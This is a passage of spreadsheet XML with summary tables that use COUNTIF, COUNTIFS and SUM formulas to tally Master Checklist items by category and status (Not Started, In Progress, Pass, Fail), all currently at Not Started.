      <c r="F7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A7,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G7" s="20" t="n">
        <f aca="false">IF(B7=0,0,(E7+F7)/B7)</f>
        <v>0</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="13" t="s">
        <v>431</v>
      </c>
      <c r="B8" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A8)</f>
        <v>9</v>
      </c>
      <c r="C8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A8,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>9</v>
      </c>
      <c r="D8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A8,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A8,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F8" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A8,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G8" s="20" t="n">
        <f aca="false">IF(B8=0,0,(E8+F8)/B8)</f>
        <v>0</v>
      </c>
    </row>
    <row r="9" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A9" s="13" t="s">
        <v>471</v>
      </c>
      <c r="B9" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A9)</f>
        <v>16</v>
      </c>
      <c r="C9" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A9,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>16</v>
      </c>
      <c r="D9" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A9,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E9" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A9,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F9" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A9,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G9" s="20" t="n">
        <f aca="false">IF(B9=0,0,(E9+F9)/B9)</f>
        <v>0</v>
      </c>
    </row>
    <row r="10" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A10" s="13" t="s">
        <v>546</v>
      </c>
      <c r="B10" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A10)</f>
        <v>15</v>
      </c>
      <c r="C10" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A10,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>15</v>
      </c>
      <c r="D10" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A10,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E10" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A10,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F10" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A10,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G10" s="20" t="n">
        <f aca="false">IF(B10=0,0,(E10+F10)/B10)</f>
        <v>0</v>
      </c>
    </row>
    <row r="11" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A11" s="13" t="s">
        <v>621</v>
      </c>
      <c r="B11" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A11)</f>
        <v>17</v>
      </c>
      <c r="C11" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A11,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>17</v>
      </c>
      <c r="D11" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A11,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E11" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A11,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F11" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A11,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G11" s="20" t="n">
        <f aca="false">IF(B11=0,0,(E11+F11)/B11)</f>
        <v>0</v>
      </c>
    </row>
    <row r="12" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A12" s="13" t="s">
        <v>703</v>
      </c>
      <c r="B12" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A12)</f>
        <v>11</v>
      </c>
      <c r="C12" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A12,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>11</v>
      </c>
      <c r="D12" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A12,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E12" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A12,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F12" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A12,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G12" s="20" t="n">
        <f aca="false">IF(B12=0,0,(E12+F12)/B12)</f>
        <v>0</v>
      </c>
    </row>
    <row r="13" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A13" s="13" t="s">
        <v>757</v>
      </c>
      <c r="B13" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A13)</f>
        <v>15</v>
      </c>
      <c r="C13" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A13,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>15</v>
      </c>
      <c r="D13" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A13,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E13" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A13,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F13" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A13,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G13" s="20" t="n">
        <f aca="false">IF(B13=0,0,(E13+F13)/B13)</f>
        <v>0</v>
      </c>
    </row>
    <row r="14" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A14" s="13" t="s">
        <v>827</v>
      </c>
      <c r="B14" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A14)</f>
        <v>13</v>
      </c>
      <c r="C14" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A14,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>13</v>
      </c>
      <c r="D14" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A14,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E14" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A14,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F14" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A14,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G14" s="20" t="n">
        <f aca="false">IF(B14=0,0,(E14+F14)/B14)</f>
        <v>0</v>
      </c>
    </row>
    <row r="15" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A15" s="13" t="s">
        <v>889</v>
      </c>
      <c r="B15" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A15)</f>
        <v>16</v>
      </c>
      <c r="C15" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A15,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>16</v>
      </c>
      <c r="D15" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A15,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E15" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A15,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F15" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A15,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G15" s="20" t="n">
        <f aca="false">IF(B15=0,0,(E15+F15)/B15)</f>
        <v>0</v>
      </c>
    </row>
    <row r="16" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A16" s="13" t="s">
        <v>964</v>
      </c>
      <c r="B16" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A16)</f>
        <v>13</v>
      </c>
      <c r="C16" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A16,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>13</v>
      </c>
      <c r="D16" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A16,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E16" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A16,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F16" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A16,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G16" s="20" t="n">
        <f aca="false">IF(B16=0,0,(E16+F16)/B16)</f>
        <v>0</v>
      </c>
    </row>
    <row r="17" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A17" s="13" t="s">
        <v>1025</v>
      </c>
      <c r="B17" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A17)</f>
        <v>10</v>
      </c>
      <c r="C17" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A17,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>10</v>
      </c>
      <c r="D17" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A17,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E17" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A17,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F17" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A17,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G17" s="20" t="n">
        <f aca="false">IF(B17=0,0,(E17+F17)/B17)</f>
        <v>0</v>
      </c>
    </row>
    <row r="18" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A18" s="13" t="s">
        <v>1073</v>
      </c>
      <c r="B18" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A18)</f>
        <v>7</v>
      </c>
      <c r="C18" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A18,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>7</v>
      </c>
      <c r="D18" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A18,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E18" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A18,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F18" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A18,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G18" s="20" t="n">
        <f aca="false">IF(B18=0,0,(E18+F18)/B18)</f>
        <v>0</v>
      </c>
    </row>
    <row r="19" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A19" s="13" t="s">
        <v>1106</v>
      </c>
      <c r="B19" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A19)</f>
        <v>13</v>
      </c>
      <c r="C19" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A19,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>13</v>
      </c>
      <c r="D19" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A19,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E19" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A19,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F19" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A19,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G19" s="20" t="n">
        <f aca="false">IF(B19=0,0,(E19+F19)/B19)</f>
        <v>0</v>
      </c>
    </row>
    <row r="20" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A20" s="13" t="s">
        <v>1168</v>
      </c>
      <c r="B20" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A20)</f>
        <v>12</v>
      </c>
      <c r="C20" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A20,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>12</v>
      </c>
      <c r="D20" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A20,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E20" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A20,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F20" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A20,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G20" s="20" t="n">
        <f aca="false">IF(B20=0,0,(E20+F20)/B20)</f>
        <v>0</v>
      </c>
    </row>
    <row r="21" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A21" s="13" t="s">
        <v>1228</v>
      </c>
      <c r="B21" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A21)</f>
        <v>10</v>
      </c>
      <c r="C21" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A21,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>10</v>
      </c>
      <c r="D21" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A21,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E21" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A21,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F21" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A21,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G21" s="20" t="n">
        <f aca="false">IF(B21=0,0,(E21+F21)/B21)</f>
        <v>0</v>
      </c>
    </row>
    <row r="22" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A22" s="13" t="s">
        <v>1275</v>
      </c>
      <c r="B22" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A22)</f>
        <v>9</v>
      </c>
      <c r="C22" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A22,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>9</v>
      </c>
      <c r="D22" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A22,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E22" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A22,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F22" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A22,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G22" s="20" t="n">
        <f aca="false">IF(B22=0,0,(E22+F22)/B22)</f>
        <v>0</v>
      </c>
    </row>
    <row r="23" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A23" s="13" t="s">
        <v>1317</v>
      </c>
      <c r="B23" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A23)</f>
        <v>7</v>
      </c>
      <c r="C23" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A23,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>7</v>
      </c>
      <c r="D23" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A23,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E23" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A23,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F23" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A23,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G23" s="20" t="n">
        <f aca="false">IF(B23=0,0,(E23+F23)/B23)</f>
        <v>0</v>
      </c>
    </row>
    <row r="24" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A24" s="13" t="s">
        <v>1350</v>
      </c>
      <c r="B24" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A24)</f>
        <v>5</v>
      </c>
      <c r="C24" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A24,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>5</v>
      </c>
      <c r="D24" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A24,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E24" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A24,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F24" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A24,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G24" s="20" t="n">
        <f aca="false">IF(B24=0,0,(E24+F24)/B24)</f>
        <v>0</v>
      </c>
    </row>
    <row r="25" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A25" s="13" t="s">
        <v>1374</v>
      </c>
      <c r="B25" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A25)</f>
        <v>6</v>
      </c>
      <c r="C25" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A25,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>6</v>
      </c>
      <c r="D25" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A25,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E25" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A25,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F25" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A25,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G25" s="20" t="n">
        <f aca="false">IF(B25=0,0,(E25+F25)/B25)</f>
        <v>0</v>
      </c>
    </row>
    <row r="26" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A26" s="13" t="s">
        <v>1401</v>
      </c>
      <c r="B26" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$B$4:$B$298,A26)</f>
        <v>10</v>
      </c>
      <c r="C26" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A26,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>10</v>
      </c>
      <c r="D26" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A26,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E26" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A26,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F26" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$B$4:$B$298,A26,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G26" s="20" t="n">
        <f aca="false">IF(B26=0,0,(E26+F26)/B26)</f>
        <v>0</v>
      </c>
    </row>
    <row r="27" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A27" s="21" t="s">
        <v>1455</v>
      </c>
      <c r="B27" s="22" t="n">
        <f aca="false">SUM(B4:B26)</f>
        <v>295</v>
      </c>
      <c r="C27" s="22" t="n">
        <f aca="false">SUM(C4:C26)</f>
        <v>295</v>
      </c>
      <c r="D27" s="22" t="n">
        <f aca="false">SUM(D4:D26)</f>
        <v>0</v>
      </c>
      <c r="E27" s="22" t="n">
        <f aca="false">SUM(E4:E26)</f>
        <v>0</v>
      </c>
      <c r="F27" s="22" t="n">
        <f aca="false">SUM(F4:F26)</f>
        <v>0</v>
      </c>
      <c r="G27" s="23" t="n">
        <f aca="false">IF(B27=0,0,(E27+F27)/B27)</f>
        <v>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7" min="2" style="0" width="16"/>
  </cols>
  <sheetData>
    <row r="1" customFormat="false" ht="24.45" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A1" s="1" t="s">
        <v>1456</v>
      </c>
      <c r="B1" s="1"/>
      <c r="C1" s="1"/>
      <c r="D1" s="1"/>
      <c r="E1" s="1"/>
      <c r="F1" s="1"/>
      <c r="G1" s="1"/>
    </row>
    <row r="3" customFormat="false" ht="24" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A3" s="11" t="s">
        <v>31</v>
      </c>
      <c r="B3" s="11" t="s">
        <v>1450</v>
      </c>
      <c r="C3" s="11" t="s">
        <v>40</v>
      </c>
      <c r="D3" s="11" t="s">
        <v>1451</v>
      </c>
      <c r="E3" s="11" t="s">
        <v>1452</v>
      </c>
      <c r="F3" s="11" t="s">
        <v>1453</v>
      </c>
      <c r="G3" s="11" t="s">
        <v>1457</v>
      </c>
    </row>
    <row r="4" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A4" s="24" t="s">
        <v>16</v>
      </c>
      <c r="B4" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$G$4:$G$298,A4)</f>
        <v>51</v>
      </c>
      <c r="C4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A4,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>51</v>
      </c>
      <c r="D4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A4,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A4,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F4" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A4,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G4" s="20" t="n">
        <f aca="false">IF((E4+F4)=0,0,F4/(E4+F4))</f>
        <v>0</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="25" t="s">
        <v>17</v>
      </c>
      <c r="B5" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$G$4:$G$298,A5)</f>
        <v>155</v>
      </c>
      <c r="C5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A5,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>155</v>
      </c>
      <c r="D5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A5,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A5,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F5" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A5,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G5" s="20" t="n">
        <f aca="false">IF((E5+F5)=0,0,F5/(E5+F5))</f>
        <v>0</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="26" t="s">
        <v>18</v>
      </c>
      <c r="B6" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$G$4:$G$298,A6)</f>
        <v>73</v>
      </c>
      <c r="C6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A6,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>73</v>
      </c>
      <c r="D6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A6,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A6,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F6" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A6,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G6" s="20" t="n">
        <f aca="false">IF((E6+F6)=0,0,F6/(E6+F6))</f>
        <v>0</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="27" t="s">
        <v>19</v>
      </c>
      <c r="B7" s="19" t="n">
        <f aca="false">COUNTIF('Master Checklist'!$G$4:$G$298,A7)</f>
        <v>8</v>
      </c>
      <c r="C7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A7,'Master Checklist'!$H$4:$H$298,"Not Started")</f>
        <v>8</v>
      </c>
      <c r="D7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A7,'Master Checklist'!$H$4:$H$298,"In Progress")</f>
        <v>0</v>
      </c>
      <c r="E7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A7,'Master Checklist'!$H$4:$H$298,"Pass")</f>
        <v>0</v>
      </c>
      <c r="F7" s="19" t="n">
        <f aca="false">COUNTIFS('Master Checklist'!$G$4:$G$298,A7,'Master Checklist'!$H$4:$H$298,"Fail")</f>
        <v>0</v>
      </c>
      <c r="G7" s="20" t="n">
        <f aca="false">IF((E7+F7)=0,0,F7/(E7+F7))</f>
